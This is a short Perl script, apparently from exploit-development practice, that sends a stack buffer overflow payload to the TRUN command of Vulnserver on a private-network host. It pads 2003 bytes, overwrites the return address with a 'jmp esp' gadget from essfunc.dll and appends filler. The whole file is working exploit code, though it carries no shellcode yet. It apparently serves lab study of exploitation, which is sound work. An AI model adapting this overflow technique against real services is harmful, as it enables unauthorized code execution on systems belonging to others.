#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket::INET;

my $host = "192.168.1.121";
my $port = 9999;

my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                 PeerPort => $port,
                                 Proto    => 'tcp');
my $payload = "";
$payload .= "A" x 2003;

# 0x625011af : "jmp esp" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
$payload .= "\xaf\x11\x50\x62";
$payload .= "C" x (5000 - length($payload));

$sock->send("TRUN /.:/" . $payload . "\n");
close $sock;
